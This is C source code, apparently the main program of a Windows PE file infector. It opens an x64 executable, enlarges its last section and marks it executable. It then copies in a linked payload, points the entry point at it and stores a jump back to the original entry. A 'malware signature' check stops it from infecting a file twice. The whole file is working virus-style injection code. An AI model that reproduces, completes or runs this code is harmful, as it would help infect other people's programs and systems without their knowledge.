#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include "payload.h"
#include "utils.h"

EXTERN_C_START
extern CONST BYTE __payload_start;
extern CONST VOID payload();
extern LONGLONG delta_start;
extern LONGLONG to_c_code;
extern DWORD code_size;
extern CONST BYTE __payload_end;
#ifndef SKIP_SIGN
extern CONST DWORD signature;
#endif
EXTERN_C_END

int main(int argc, char* argv[]) {
    int ret = 0;
    HANDLE hFile, hMapFile;
    LPVOID pMapAddress;
    DWORD dwFileSize, dwFileAlignment, dwSizeAligned, dwSectionAlignment, dwLastSectionPtr,
        dwLastSectionSize, dwLastSectionRva, dwPayloadPtr, dwOrigEntryPoint, dwNewEntryPoint,
        dwOldProtect;
    ULARGE_INTEGER uliSize;
    PCIMAGE_DOS_HEADER pDosHeaderRO;
    PCIMAGE_NT_HEADERS64 pNtHeaderRO;
    PCIMAGE_SECTION_HEADER pSectionRO, pLastSectionRO;
    PIMAGE_DOS_HEADER pDosHeaderRW;
    PIMAGE_NT_HEADERS64 pNtHeaderRW;
    PIMAGE_SECTION_HEADER pSectionRW, pLastSectionRW;
    WORD wNbSections;
#ifndef SKIP_SIGN
    DWORD dwSignature;
#endif

    CONST DWORD dwPayloadSize = (DWORD)((PCBYTE)&__payload_end - (PCBYTE)&__payload_start);
    printf("Payload size: %lu\n", dwPayloadSize);
    printf("Payload: %p\n", &__payload_start);
    // HexDump((PCBYTE)&__payload_start, dwPayloadSize);

    if (argc < 2) {
        fprintf(stderr, "Usage: %s <filename.exe>\n", argv[0]);
        ret = 1;
        goto exit;
    }

    printf("Reading file: %s\n", argv[1]);

    hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintError("CreateFileA");
        ret = 1;
        goto exit;
    }

    dwFileSize = GetFileSize(hFile, NULL);
    printf("File size: %lu bytes\n", dwFileSize);
    LIQUAD(uliSize) = dwFileSize;

    hMapFile = CreateFileMappingA(hFile, NULL, PAGE_READONLY, LIHILO(uliSize), NULL);
    if (hMapFile == NULL) {
        PrintError("CreateFileMappingA");
        ret = 1;
        goto close_file;
    }

    pMapAddress = MapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, 0);
    if (pMapAddress == NULL) {
        PrintError("MapViewOfFile");
        ret = 1;
        goto close_map;
    }

    pDosHeaderRO = (PCIMAGE_DOS_HEADER)pMapAddress;
    if (pDosHeaderRO->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Invalid DOS signature\n");
        ret = 1;
        goto unmap;
    }
    pNtHeaderRO = (PCIMAGE_NT_HEADERS64)((PBYTE)pDosHeaderRO + pDosHeaderRO->e_lfanew);
    if (pNtHeaderRO->Signature != IMAGE_NT_SIGNATURE ||
        pNtHeaderRO->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
        pNtHeaderRO->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        printf("[!] Not a PE x64 file\n");
        ret = 1;
        goto unmap;
    }

    dwFileAlignment = pNtHeaderRO->OptionalHeader.FileAlignment;
    dwSectionAlignment = pNtHeaderRO->OptionalHeader.SectionAlignment;
    printf("File alignment:    %#lx (%lu)\n", dwFileAlignment, dwFileAlignment);
    printf("Section alignment: %#lx (%lu)\n", dwSectionAlignment, dwSectionAlignment);

    wNbSections = pNtHeaderRO->FileHeader.NumberOfSections;
    pSectionRO = IMAGE_FIRST_SECTION(pNtHeaderRO);
    pLastSectionRO = &pSectionRO[wNbSections - 1];
    dwLastSectionPtr = pLastSectionRO->PointerToRawData;
    dwLastSectionSize = pLastSectionRO->SizeOfRawData;
    dwLastSectionRva = pLastSectionRO->VirtualAddress;
    dwPayloadPtr = dwLastSectionPtr + dwLastSectionSize;
    dwOrigEntryPoint = pNtHeaderRO->OptionalHeader.AddressOfEntryPoint;
    printf("Entry point: %#010lx\n", dwOrigEntryPoint);
    printf("Last section name: %s\n", pLastSectionRO->Name);
    printf("Last section pointer: %#010lx\n", dwLastSectionPtr);
    printf("Old raw size:      %#lx (%lu)\n", dwLastSectionSize, dwLastSectionSize);
    printf("Old virtsize:      %#lx (%lu)\n", pLastSectionRO->Misc.VirtualSize,
           pLastSectionRO->Misc.VirtualSize);
    printf("Old size of code:  %lu\n", pNtHeaderRO->OptionalHeader.SizeOfCode);
    printf("Old size of image: %lu\n", pNtHeaderRO->OptionalHeader.SizeOfImage);

#ifndef SKIP_SIGN
    if (dwOrigEntryPoint >= dwLastSectionRva &&
        dwOrigEntryPoint < dwLastSectionRva + dwLastSectionSize) {
        dwSignature = *(PCDWORD)((PCBYTE)pDosHeaderRO + dwLastSectionPtr +
                                 (dwOrigEntryPoint - dwLastSectionRva) -
                                 ((PCBYTE)&payload - (PCBYTE)&signature));
        printf("\nEntry point seems suspicious (inside last section)\n");
        printf("Malware signature: %#010lx\n", dwSignature);
        if (dwSignature == signature) {
            printf("Payload already injected!\n");
            ret = 1;
            goto unmap;
        }
    }
#endif

    dwSizeAligned = ALIGN(dwPayloadSize, dwFileAlignment);
    printf("Aligned payload size: %#lx (%lu)\n", dwSizeAligned, dwSizeAligned);

    UnmapViewOfFile(pMapAddress);
    CloseHandle(hMapFile);

    VirtualProtect(&code_size, sizeof(code_size), PAGE_READWRITE, &dwOldProtect);
    code_size = dwPayloadSize;
    VirtualProtect(&code_size, sizeof(code_size), dwOldProtect, &dwOldProtect);

    VirtualProtect(&to_c_code, sizeof(to_c_code), PAGE_READWRITE, &dwOldProtect);
    to_c_code = (PCBYTE)&inj_code_c - (PCBYTE)&payload;
    VirtualProtect(&to_c_code, sizeof(to_c_code), dwOldProtect, &dwOldProtect);

    LIQUAD(uliSize) = ALIGN(dwFileSize + dwSizeAligned, dwFileAlignment);

    hMapFile = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, LIHILO(uliSize), NULL);
    if (hMapFile == NULL) {
        PrintError("CreateFileMappingA");
        ret = 1;
        goto close_file;
    }

    pMapAddress = MapViewOfFile(hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
    if (pMapAddress == NULL) {
        PrintError("MapViewOfFile");
        ret = 1;
        goto close_map;
    }

    printf("[*] Injecting payload...\n");

    pDosHeaderRW = (PIMAGE_DOS_HEADER)pMapAddress;
    pNtHeaderRW = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeaderRW + pDosHeaderRW->e_lfanew);
    pSectionRW = IMAGE_FIRST_SECTION(pNtHeaderRW);
    pLastSectionRW = &pSectionRW[wNbSections - 1];

    pLastSectionRW->Misc.VirtualSize = pLastSectionRW->SizeOfRawData + dwPayloadSize;
    pLastSectionRW->SizeOfRawData += dwSizeAligned;
    pNtHeaderRW->OptionalHeader.SizeOfCode += pLastSectionRW->Characteristics & IMAGE_SCN_CNT_CODE
                                                  ? dwSizeAligned
                                                  : pLastSectionRW->SizeOfRawData;
    pNtHeaderRW->OptionalHeader.SizeOfImage =
        ALIGN(dwLastSectionRva + pLastSectionRW->Misc.VirtualSize, dwSectionAlignment);
    pLastSectionRW->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
    pLastSectionRW->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
    printf("New raw size:      %#lx (%lu)\n", pLastSectionRW->SizeOfRawData,
           pLastSectionRW->SizeOfRawData);
    printf("New virtsize:      %#lx (%lu)\n", pLastSectionRW->Misc.VirtualSize,
           pLastSectionRW->Misc.VirtualSize);
    printf("New size of code:  %lu\n", pNtHeaderRW->OptionalHeader.SizeOfCode);
    printf("New size of image: %lu\n", pNtHeaderRW->OptionalHeader.SizeOfImage);

    dwNewEntryPoint =
        dwLastSectionRva + dwLastSectionSize + (LONG)((PCBYTE)&payload - (PCBYTE)&__payload_start);
    pNtHeaderRW->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;
    printf("New entry point: %#010lx\n", dwNewEntryPoint);

    VirtualProtect(&delta_start, sizeof(delta_start), PAGE_READWRITE, &dwOldProtect);
    delta_start = (LONGLONG)dwOrigEntryPoint - (LONGLONG)dwNewEntryPoint;
    VirtualProtect(&delta_start, sizeof(delta_start), dwOldProtect, &dwOldProtect);
    printf("delta_start: %#018llx (%lld)\n", delta_start, delta_start);

    printf("New payload:\n");
    HexDump(&__payload_start, dwPayloadSize);

    memcpy((PBYTE)pDosHeaderRW + dwPayloadPtr, &__payload_start, dwPayloadSize);

    printf("[*] Injection complete!\n");

    FlushViewOfFile(pMapAddress, 0);
unmap:
    UnmapViewOfFile(pMapAddress);
    FlushFileBuffers(hFile);
close_map:
    CloseHandle(hMapFile);
close_file:
    CloseHandle(hFile);
exit:
    return ret;
}
